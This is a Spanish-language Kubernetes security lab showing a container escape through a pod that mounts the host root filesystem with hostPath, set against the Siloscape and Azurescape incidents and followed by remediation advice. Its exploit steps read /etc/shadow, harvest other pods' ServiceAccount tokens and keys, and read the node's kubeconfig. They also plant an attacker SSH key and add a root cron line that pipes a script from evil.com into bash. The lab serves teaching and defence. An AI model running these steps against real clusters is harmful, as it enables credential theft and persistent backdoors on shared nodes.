# Lab 2: hostPath Abuse — Escape al Host

## Objetivo

Demostrar cómo un Pod con `hostPath: /` montado como volumen permite a un atacante leer credenciales del nodo, tokens de otros Pods, inyectar SSH keys y obtener acceso root al host.

## 🔴 Caso Real: Siloscape (2021)

**Siloscape** fue el primer malware conocido que explotó activamente contenedores Windows en Kubernetes. Usaba hostPath y privilegios elevados para escapar del contenedor al nodo host. Una vez en el nodo, se conectaba a un servidor C2 via Tor y desplegaba criptomineros y backdoors en todo el cluster. Afectó más de **300 clusters** comprometidos antes de ser detectado.

## 🔴 Caso Real: Azurescape (2021)

Investigadores de Palo Alto descubrieron **Azurescape**, una vulnerabilidad que permitía escapar de Azure Container Instances al nodo host vía volúmenes montados. Un atacante podía leer el filesystem completo del host y tomar control de contenedores de **otros clientes** en el mismo nodo.

---

## Archivos

| Archivo | Descripción |
|---------|-------------|
| `vulnerable.yaml` | Pod con `hostPath: /` + app víctima con secrets |

---

## Fase 1: Desplegar Escenario Vulnerable

```bash
kubectl apply -f vulnerable.yaml
kubectl get pods -n lab3-hostpath -w
```

## Fase 2: Explotar hostPath

### Paso 1: Acceder al pod atacante

```bash
kubectl exec -it -n lab3-hostpath hostpath-pod -- bash
```

### Paso 2: Leer credenciales del host

```bash
# Verificar que tenemos acceso al filesystem del host
ls /host/
# → bin boot dev etc home lib ...  (¡filesystem completo!)

# Leer usuarios y hashes del host
cat /host/etc/shadow
# → root:$6$...:19000:0:99999:7:::

cat /host/etc/passwd | grep -v nologin

# Leer hostname del host
cat /host/etc/hostname
```

### Paso 3: Robar tokens de OTROS Pods

```bash
# Buscar tokens de ServiceAccount de otros pods
find /host/var/lib/kubelet/pods/ -name "token" 2>/dev/null
find /host/var/lib/kubelet/pods/ -path "*/serviceaccount/token" -exec cat {} \; 2>/dev/null

# Buscar secrets montados en otros pods
find /host/var/lib/kubelet/pods/ -name "*.key" -o -name "*.pem" -o -name "*.conf" 2>/dev/null
```

### Paso 4: Leer kubeconfig del nodo (si existe)

```bash
# En nodos master/control-plane:
cat /host/etc/kubernetes/admin.conf 2>/dev/null
cat /host/etc/kubernetes/kubelet.conf 2>/dev/null

# Variables de entorno del kubelet
cat /host/var/lib/kubelet/config.yaml 2>/dev/null
```

### Paso 5: Inyectar SSH key para persistencia

```bash
# Crear directorio .ssh si no existe
mkdir -p /host/root/.ssh

# Inyectar llave pública del atacante
echo 'ssh-rsa AAAAB3...atacante@kali' >> /host/root/.ssh/authorized_keys

# Ahora el atacante puede: ssh root@<node-ip>
```

### Paso 6: Escribir crontab para backdoor persistente

```bash
# Inyectar backdoor en crontab del host
echo '* * * * * curl http://evil.com/backdoor.sh | bash' >> /host/var/spool/cron/crontabs/root
```

---

## Remediación Recomendada

| Medida | Descripción |
|--------|-------------|
| **PSA restricted** | Previene volúmenes hostPath a nivel de namespace |
| **Kyverno/OPA** | Policy `deny-host-path` para bloquear hostPath |
| **SecurityContext** | runAsNonRoot + readOnlyRootFilesystem + drop ALL |
| **emptyDir** | Usar volúmenes efímeros en lugar de hostPath |

---

## Cleanup

```bash
kubectl delete namespace lab3-hostpath
```
